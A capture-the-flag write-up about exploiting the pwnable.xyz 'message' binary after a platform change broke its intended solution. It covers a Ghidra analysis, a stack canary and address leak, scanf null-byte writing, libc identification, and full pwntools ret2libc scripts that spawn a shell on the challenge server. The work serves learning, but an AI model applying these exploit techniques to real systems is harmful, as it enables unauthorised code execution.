---
# editPost:
#     URL: "https://github.com/<path_to_repo>/content"
#     Text: "Suggest Changes" # edit text
#     appendFilePath: true # to append file path to Edit link
# weight: 1
# aliases: ["/first"]
# author: ["Me", "You"] # multiple authors
# canonicalURL: "https://canonical.url/to/page"
hidemeta: false
comments: false
disableHLJS: true # to disable highlightjs
disableShare: false
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true # To disable table of content
showToc: true # Hide table of content
TocOpen: true # Show expanded table of content?
draft: false # remember to change this
# cover:
#     image: "<image path/url>" # image path/url
#     alt: "<alt text>" # alt text
#     caption: "<text>" # display caption under cover
#     relative: false # when using page bundles set this to true
#     hidden: true # only hide on current single page
description: "Challenge broken? Try harder!"
tags: ["reverse engineering", "gdb", "ghidra", "vulnerability research", "python"]
author: "Jacopo Scannella"
title: "Pwning the (broken) unbreakable challenge: message"
date: 2024-10-23T15:59:30+02:00
---

This post is about an old pwn challenge which, after (probably a kernel) update, broke and it was not possible to solve in the intended way anymore. The challenge in question is [message from pwnable.xyz](https://pwnable.xyz). I got fixated with breaking this challenge in an unintended way and eventually I was able to do it.

Even though no new or fancy technique was used for this, I hope this post inspires somebodye else to do that one thing that seems impossible but you have that strong suspicion you could be the one to do it, against all odds.

# Overview and intended solution

{{< bundle-image
      name="checksec.png"
      alt="checksec of message"
      caption="checksec of message"
      style="max-width: 55%" >}}

It was possible to connect to the challenge using `netcat`:

```bash
$ nc svc.pwnable.xyz 30017
Message taker.
Message:
```

{{<notice tip>}}
Pwn challenges are usually structured in this way: you get the binary of the service / program you are supposed to exploit and the ip / hostname and port of a service running the same version of the program. Having the binary file allows reverse engineering and vulnerability research of such binary.

The ultimate goal of the challenge / exercise is to execute code and retrieve the flag (E.G. by running `cat /flag`)
{{</notice>}}

Once provided a message, the challenge replied as follows:

```
Message taker.
Message: hi
Menu:
1. Edit message.
2. Print message.
3. Admin?
> 
```

The first two menu entries (`Edit message` and `Print message`) were quite self-explanatory, but the third one was suspicious. Trying to input an invalid number (E.G. `7`) would result in the following error message:

```
> 7
Error: 7 is not a valid option
```

Opening the challenge in Ghidra, editing some variable types and name, the challenge's main decompiled as the following pseudocode (edited):

```c
int main() {
  uint menu;
  long in_FS_OFFSET;
  char message [40];
  long canary = *(long *)(in_FS_OFFSET + 0x28);
  
  setup();
  puts("Message taker.");
  printf("Message: ");
  scanf("%s",message);
  getchar();

  while (true) {
    print_menu();
    printf("> ");
    menu = get_choice();
    switch(menu) {
      case 0:
        if (canary != *(long *)(in_FS_OFFSET + 0x28))
            __stack_chk_fail(); // Canary check failed, will crash here
        return 0;
      case 1:
        printf("Message: ");
        scanf("%s",message);
        getchar();
        break;
      case 2:
        printf("Your message: %s\n",message);
        break;
      case 3:
        if (admin != 0)
          win();
        break;
      default:
        printf("Error: %d is not a valid option\n",(ulong)menu);
    }        
  }
}
```

{{<notice tip>}}
The `win` function executes `system('cat /flag')`. Not all pwn challenges have this function, in this case it was present and it *usually* makes the exploitation easier.
{{</notice>}}

From the code above we can learn three things:
1. There is a hidden option (`0`) which allows us to return from the `main` function and thus exit the program
2. The `3. Admin?` option checks for the `admin` variable in `.bss` (which has permission Read-Write). Thus, it is possible to win by writing to the `admin` and running this option. As far as my VR knowledge goes, this path is actually a rabbit hole and not the intended way to exploit the binary.
3. There is a pretty serius bug in the code, can you spot it?

## Bug #1: stack-based buffer overflow in `Edit message`

The code handling the editing of the message is vulnerable:

```c
int main() {
  // ...
  char message [40];
  // ... 
      case 1:
        printf("Message: ");
        scanf("%s",message);
        getchar();
```

The `scanf`function with the `"%s"` format will read an unbound number of bytes from `stdin` into the 40 bytes-long `message` buffer. Writing more than 40 bytes will result in a stack-based buffer overflow and other local variables or data in the stack frame will be overwritten.

This exploit primitive has a boundary, which will come into play in the exploitation step. As some of you may already know, the `scanf` function family will interpret many characters as **spaces**, which are used as separators. This means that in practice we are not able to send raw binary data, but there are constrains on the data it is possible to send. Looking at the documentation of [isspace](https://en.cppreference.com/w/c/string/byte/isspace) it was possible to identify the bad characters:

{{< bundle-image
      name="isspace.png"
      alt="isspace() documentation on CPPreference.com"
      caption="isspace() documentation on CPPreference.com" >}}

Moreover, NULL bytes (`\x00`) will also be interpreted as a separator.

{{<notice note>}}
Even though it seems like sending `\x00` (NULL bytes) might not be possible, there is a detail allowing us to do that, can you spot it?

We will disucuss about this in the exploitation section in a bit. 
{{</notice>}}

It is important to note that due to the presence of the [stack canary](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries), this vulnerability by itself is not enough to Control-Flow Hijack the program.

It was possible to test the vulnerability by running the target locally, edit the message providing a really long message and observe the program crash once requested to exit:

```
$ ./challenge 
Message taker.
Message: hi
Menu:
1. Edit message.
2. Print message.
3. Admin?
> 1
Message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Menu:
1. Edit message.
2. Print message.
3. Admin?
> 0
*** stack smashing detected ***: terminated
```

## Bug #2: information leak in `get_choice()`

The `get_choice()` function is the one used to get the next menu choice. Once opened and decompiled with Ghidra it shows a pseudocode similar to the following (edited):

```c
uint get_choice(void) {
    long canary = *(long *)(in_FS_OFFSET + 0x28);
    byte buf[10] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9};
    
    int c = getchar();
    getchar();  // Consume newline or extra character
    
    if (canary != *(long *)(in_FS_OFFSET + 0x28))
        __stack_chk_fail();  // Stack cookie check

    return (uint)buf[c - '0'];  // Return selected choice based on input
}
```

The `c` variable is not checked and is used to access the `buf` buffer on the stack. The developer of this function assumed that the user would input only digit characters. (Un)fortunately, any byte is accepted by `getchar()`, meaning that it is possible to exit the boundaries of `buf` quite easily.


Thereafter, in the main function, this value is then assigned to the `menu` variable and, if the said value is not a valid menu item, gets **printed**:

```c
int main() {
    // ...
    print_menu();
    printf("> ");
    menu = get_choice();
    switch(menu) {
      // ...
      default:
        printf("Error: %d is not a valid option\n",(ulong)menu);
```

These two behavior combined provide a pretty powerful information leak primitive, having the following restrictions:
1. You can only read one byte at a time.
2. If you happen to read a byte having value `[0, 3]`, you are going to execute some other command in the `switch`.  Most importantly, **if the value happens to be zero, the program is going to terminate.**
3. The offset which we can use to overflow / underflow the buffer access is quite limited (a single character, thus 256 values 10 of which are the buffer size).


## Exploit design and implementation

The neat thing about bug #2, is that it allows us to leak the stack canary (which is shared between all functions in a thread) and the return address to main, effectively defeating both the canary and the [ASLR](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Randomization) mitigation.

If we are lucky enough, we will not encounter any bad character (`[0, 3]`) and leak both the canary and the return address in the stack frame. Once that is done, it is possible to calculate the address of `win`.

Thereafter, using the bug #1, it is possible to overwrite the return address in the stack frame of the `main` function to make it return to win, taking care of writing the stack cookie.

### Problem 1: Reading bad bytes

What if we are unlucky and the bytes we want to leak have bad values (`[0, 3]`)?

I found two approaches, both valid:
1. Make the exploit hang / crash in these cases and run it again, crossing fingers 🤞
2. Handle the cases `[1, 3]` and retry automatically in case `0` (forced crash)

Being lazy, I implemented #1. A serious exploit would need to be designed with design #2 in mind.

### Problem 2: Writing zeroes

By consulting glibc source code, it is possible to see that [the stack cookie will always contain a zero byte](https://elixir.bootlin.com/linux/v6.11.5/source/include/linux/stackprotector.h#L10), namely the least significant byte. We can easily skip reading that, but how to write it?

`scanf()` does not allow us to write zeroes, or does it? If you recall, in the *"Programming in C 101 course"*, you learned that C strings are **zero terminated**. `scanf()` follows this standard and all the strings it scans will be zero terminated. Since we are able to call our write primitive multiple times without triggering the exploit, we are able to write an arbitrary number of zeroes.

For each zero starting from the last, we will need to write all the data between the current zero and the next, filling the rest with valid characters:

```py
# https://stackoverflow.com/a/34445090
def findall(p: bytes, s: bytes):
    i = s.find(p)
    while i != -1:
        yield i
        i = s.find(p, i+1)

# Utility function to write payloads having zeroes in it using multiple writes and scanf string terminator.
def bof(data: bytes):
    zeroes = list(findall(b"\x00", data))[::-1]
    for i,z in enumerate(zeroes):
        if i == len(zeroes) - 1:
            payload = data[:z]
        else:
            j = zeroes[i+1]
            payload = flat({j+1: data[j+1:z]}, length=len(data[:z]))
        _bof(payload) # Dumb buffer overflow primitive
```

If you want to visualize it, follows an example (where the ඞ character represents any valid character):

```py
 bof(b"hack\x00the\x00\x00planet")
 |->
_bof(b"ඞඞඞඞඞඞඞඞඞඞplanet")
_bof(b"ඞඞඞඞඞඞඞඞඞ")
_bof(b"ඞඞඞඞඞthe")
_bof(b"hack")
```

### Problem 3: Writing bad bytes

What if the `win` function address or the stack cookie contains bytes which are valid for the read primitive but invalid for the write one? In this case, the only way to handle this case is to retry. A real exploit would need to do it automatically, I decided to just let the exploit crash on an `assert()` and let the user try again manually.

### Intended solution

Using [pwntools](https://docs.pwntools.com/en/stable/) the intended solution looked something like this:

```py
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./challenge')
io = connect('svc.pwnable.xyz', 30017)
sla = io.sendlineafter
sa = io.sendafter
sla(b"Message: ", b"A")

def leak_byte(idx: int):
    assert(-0x80 <= idx <= 0x7F) # signed char
    sla(b"> ", ((idx + 0x30)%256).to_bytes(1))
    assert(io.recvuntil(b"Error: ", timeout=0.5) != b"") # If you crashed / hanged here, ASLR failed you
    return int(io.recvuntil(b" ").decode()).to_bytes(1)

def leak_bytes(start_pos: int, n: int):
    return b"".join(leak_byte(i) for i in range(start_pos, start_pos+n))

def bo(data: bytes):
    sla(b"> ", b"1")
    sla(b"Message: ", data)

# https://stackoverflow.com/a/34445090
def findall(p: bytes, s: bytes):
    i = s.find(p)
    while i != -1:
        yield i
        i = s.find(p, i+1)

# Utility function to write payloads having zeroes in it using multiple writes and scanf string terminator.
def bof(data: bytes):
    zeroes = list(findall(b"\x00", data))[::-1]
    for i,z in enumerate(zeroes):
        if i == len(zeroes) - 1:
            payload = data[:z]
        else:
            j = zeroes[i+1]
            payload = flat({j+1: data[j+1:z]}, length=len(data[:z]))
        _bof(payload)

p = log.progress("Info leaking")
p.status("stack cookie (might hang / crash here)")
stack_cookie = leak_bytes(11, 7).rjust(8, b"\x00")
p.status("ret address (might hang / crash here)")
main_addr = leak_bytes(11+7+8,6).ljust(8, b"\x00")
p.success("leaked stack cookie and ret address")
exe.address = u64(main_addr) - exe.sym['main'] - 113 # 113 is the offset of the return address to main
win = p64(exe.sym['win']+1) # Use win+1 to skip the push and align the stack for the system()
log.info(f"cookie: 0x{u64(stack_cookie):08x}")
log.info(f"win: 0x{u64(win):08x}")
BAD_CHARS = [b"\t", b" ", b"\n", b"\v", b"\f", b"\r"] # 0x9, 0x20, 0xa, 0xb, 0xc, 0xd
assert(all(x not in stack_cookie for x in BAD_CHARS)) # unlucky ASLR
assert(all(x not in win for x in BAD_CHARS)) # unlucky ASLR
log.success("ASLR and canary bypassed!")
bof(flat({0x28: stack_cookie, 0x38: win[:6]}))
sla(b">", b"0")
print(io.recvall(timeout=0.5).decode())
```

Running it a thousand times, it will never go past the last assert:

{{< bundle-image
      name="crash.png"
      alt="Houston, we have a problem"
      caption="Houston, we have a problem"
      style="max-width: 85%" >}}

I decided to dig deeper.

{{< bundle-image
      name="memes.jpg"
      alt="😊🔫"
      style="max-width: 85%" >}}


# OSINT

After spending a good chunk of time on the challenge, I resorted to searching for information on the web.

## Old writeups on Github

I was able to find [different](https://github.com/h0meb0dy/pwnable.xyz/blob/bebb7c98c4d3c6265cc6b644bb94ac34adaede52/message/ex.py) [solutions](https://github.com/h0meb0dy/pwnable.xyz/blob/bebb7c98c4d3c6265cc6b644bb94ac34adaede52/message/ex.py) on Github to this challenge. They were, at the core, the same as mine.

{{< bundle-image
      name="kimba.jpg"
      alt="THE HAIL THE REAL LION KING KIMBA"
      style="max-width: 85%" >}}

## Discussion on Discord

I decided to join the [pwnable.xyz](https://pwnable.xyz) Discord, and searching for the challenge name I was able to find the following:

{{< bundle-image
      name="discord1.png"
      alt="Discord interaction between the CTF creator and a player"
      caption="Discord interaction between the CTF creator and a player" >}}

Mmm very interesting, it looks like a kernel update might have broken the challenge.
Looking at more recent messages, it was possible to find other players having trouble solving the challenge:

{{<bundle-image
      name="discord2.png"
      alt="Discord interaction between players"
      caption="Discord interaction between players"
      style="max-height: 50%" >}}

## Recent solutions from korean pwners

At this point I was 100% sure that the challenge was bugged and that the intended solution would never work. Another question popped in my mind: did anybody solve after it bugged? If somebody did, then it is reasonable to think that a working solution exists.

I started looking at the leaderboard for recent solvers in the top 100 and quickly my eye fell on [ssongkit](https://ssongkit.tistory.com/)'s profile and I was happy to see that he solved the challenge just 2 days before the original report of `message` being broken by [natinati](https://example.com) on discord.

His profile was also linking to his blog: promising. Unfortunately, [the writeup was locked by a password](https://ssongkit.tistory.com/707)

I dorked the second level domain hoping to find more recent korean solvers:

{{<bundle-image
      name="kagi-dork.png"
      alt="Dorking recent tistory.com message solvers"
      caption="Dorking recent tistory.com message solvers" >}}

I was able to find another recent solver, [skysquirrel](https://skysquirrel.tistory.com). Unfortunately, [their writeup was locked as well](https://skysquirrel.tistory.com/371) but it was from the first days of february as well.

Did `message` broke exactly after ssongkit solved it? There was only one way to find out.

## Scraping the leaderboard
I decided to do the only possible remaining thing to do: using the power of requests and BeautifoulSoup to [scrape the top 1000 leaderboard and look for recent solvers of message](https://gist.github.com/antipatico/9d27547f00c12758724645d5f14bce3c):

```
------------------  -------------------------------
[+] Finding recent solves of 'message': Done
-------------  -------------------------------  -------------------
n1x1           https://pwnable.xyz/user/20622/  2024-07-11 16:53:00
jro            https://pwnable.xyz/user/3804/   2024-03-28 01:04:00
dlwhdrnr2684   https://pwnable.xyz/user/13045/  2024-02-29 20:38:00
rlatkdqls0324  https://pwnable.xyz/user/19298/  2024-02-04 07:01:00
ssongk         https://pwnable.xyz/user/11147/  2024-02-03 04:58:00
-------------  -------------------------------  -------------------
```

Wow! I was not expecting other people to solve it. Either they had the flag previously (or found it online / shared with a friend) or they were able to actually break it in this new state.

# Fishing for libc

Looking at the stack layout of `message` in the `get_choice` function, I noted that an address to the libc was present in the leakable range. Testing on the target, it was possible to leak 3 (presunt) libc pointers:

```py
def leak_p64(idx: int, size: int):
    return leak_bytes(idx, size).ljust(8, b"\x00")

leak_n_print = lambda i: log.info(f"{hex(i)}: {hex(u64(leak_p64(i, size=6)))}")

leak_n_print(-0x66)
leak_n_print(-0x56)
leak_n_print(-0x36)
```

{{<bundle-image
      name="libc_leak.png"
      alt="Leaking libc pointers"
      caption="Leaking libc pointers"
      style="max-width: 85%" >}}

If the libc binary was retrieved, writing a [ROP-chain](https://en.wikipedia.org/wiki/Return-oriented_programming) would become easy enough:

1. Leak `libc` address and `stack_cookie`
2. Buffer-overflow `main` stack frame to return to a `pop rdi; ret` gadget in the libc (taking care of writing back the leaked `stack_cookie`)
3. Using the gatget, load the `/bin/sh` string from libc in rdi (first parameter according to [System V x86_64 ABI](https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI))
4. Use the second part of the gadget (`ret`), return to `system`

The final payload would look something like this:

{{<bundle-image
      name="ret2libc_payload.png"
      alt="Accurate diagram showing in detail the payload structure"
      caption="Accurate diagram showing in detail the payload structure - excalidraw.com"
      style="max-width: 85%" >}}

## Let the fishing begin

So my quest began: run the challenge on as many containers as possible, installing all possible versions of libc in search of a binary matching the last 3 nibbles of the libc leaked addresses.

This time, instead of relying on the unstable leak primitive, I decided to use `gdb` to get more consistent results.

First, I created a script to scrape the libc `deb` pkgs from the Ubuntu packages web pages for a given Ubuntu release.

Then, I created another script to automatically create a container with the given Ubuntu release and automate the print of the offsets using this [GEF ](https://hugsy.github.io/gef/) script:

```bash
gef-remote 172.17.0.2 31337
break *get_choice+0x44
continue
set logging file fish.txt
set logging enabled on
dereference -l 1 $rsp-0x58
dereference -l 1 $rsp-0x48
dereference -l 1 $rsp-0x28
set logging enabled off
kill
quit
```

Which resulted in an output file like this:

```
2.27-3ubuntu1.6
0x00007ffd7caeabf8│+0x0000: 0x00007fa5b348d0f8  →  <_IO_file_underflow+0128> test rax, rax
0x00007ffd7caeac08│+0x0000: 0x00007fa5b37e82a0  →  0x0000000000000000
0x00007ffd7caeac28│+0x0000: 0x00007fa5b348e3a2  →  <_IO_default_uflow+0032> cmp eax, 0xffffffff
2.27-3ubuntu1.5
0x00007ffeab3713b8│+0x0000: 0x00007f2c5c88d0f8  →  <_IO_file_underflow+0128> test rax, rax
0x00007ffeab3713c8│+0x0000: 0x00007f2c5cbe82a0  →  0x0000000000000000
0x00007ffeab3713e8│+0x0000: 0x00007f2c5c88e3a2  →  <_IO_default_uflow+0032> cmp eax, 0xffffffff
```

I tried all versions of Ubuntu from 20 to 16, without success. The closest hit was Bionic with **libc 2.27** (showed in the snippet above).

In this case, the addresses were present for all 3 offsets, and the distance between the middle one and the other two were similar to the one on the remote target.

That being said, the nibbles did not match and using [libcdb](https://libc.rip) did not help. I tried various versions of libc close to 2.27 of Debian and Fedora, with a similar approach, without success.

# A hint from the future

After all the effort and time spent on this without results I was pretty demotivated. I was sick (physically and mentally) and I gave up on pwning for several days. When I finally came back to it, I pwned the next challenge quite quickly ([_IO_FILE exploits are cool!](https://seb-sec.github.io/2020/04/29/file_exploitation.html)) and moved to the one next to it.

I decompressed the archived and then...

```
$ tar -xvf rwsr.gz 
image/challenge/challenge
image/libc/alpine-libc-2.28.so
```

A GLIBC version of Alpine?! And it roughly matches the version giving good results for `message`?! I did not test alpine, since it runs [musl libc](https://musl.libc.org/) by default.

I *"quickly"* came back to `message` and wrote a `Dockerfile` for an alpine container that would listen on `31337` exposing the challenge and on `31338` for a remote `gdb` connection.


{{<notice warning>}}
Making the setup work with `gdb` was extremely cumbersome and took quite some time. I am not going into details here because I feel I would not do a good job at explaining it.

Long story short, loading a binary using a different libc used by `gdb` will result in all kinds of problems. It is left as an exercise for the reader to try and reproduce the setup themselves.
{{</notice>}}

Then, I tested the leak script in this container...

{{<bundle-image
      name="leak-bingo.png"
      alt="Bingo!"
      caption="Bingo!"
      style="max-width: 65%" >}}

Now it was only a matter of getting the position of the leaked addresses, to be able to recover the libc base. I was able to do that with a GEF script, which resulted in the following:

```
alpine-glibc-2.28-rc0
0x00007fffffffeb38│+0x0000: 0x00007ffff747b22d  →  <_IO_file_underflow+00dd> cmp rax, 0x0
0x00007fffffffeb48│+0x0000: 0x00007ffff77b42a0  →  0x0000000000000000
0x00007fffffffeb68│+0x0000: 0x00007ffff747c412  →  <_IO_default_uflow+0032> cmp eax, 0xffffffff
```


# Solution

The solution is a simple [ret2libc](https://en.wikipedia.org/wiki/Return-to-libc_attack), as previously described:

```py
p = log.progress("Info leaking (might hang / crash here)")
p.status("stack cookie")
stack_cookie = leak_bytes(11, 7).rjust(8, b"\x00") # Skipping last byte, it's always going to be 0
p.status("libc _IO_file_underflow")
libc_uflow = leak_p64(-0x66,6)
p.success("leaked stack cookie, ret address and libc")
libc.address = u64(libc_uflow) - 0xdd - libc.sym["_IO_file_underflow"]
system = p64(libc.sym["system"]) # cannot use win() due to \n in its address
gadget = p64(libc.address + POP_RDI_RET_LIBC) # pop rdi; ret;
binsh = p64(next(libc.search(b"/bin/sh")))
BAD_CHARS = [b"\t", b" ", b"\n", b"\v", b"\f", b"\r"] # \x00 is good because we can go multiple writes
log.info(f"cookie: 0x{u64(stack_cookie):08x}")
log.info(f"libc /bin/sh: 0x{u64(binsh):08x}")
assert(all(x not in obj for obj in [stack_cookie, system, binsh, gadget] for x in BAD_CHARS)) # unlucky ASLR
log.success("ASLR and canary bypassed!")
p2 = log.progress("Popping shell")
bof(flat({0x28: stack_cookie, 0x38: gadget, 0x40: binsh, 0x48: system}))
sla(b"> ", b"0")
p2.success("")
io.interactive()
```

In action:

{{<bundle-image
      name="ret2libc.png"
      alt="ret2libc"
      caption="ret2libc"
      style="max-height: 50%" >}}

And if you made it all the way to the end—congratulations, brave reader! Thanks for sticking with me through this wild ride. Hopefully, you not only enjoyed it but picked up a new insight or two along the way.

As for me? I learned firsthand that what looks like a simple problem often has a way of masking a much deeper, more tangled challenge. But hey, that's exactly what makes the final breakthrough all the more satisfying!
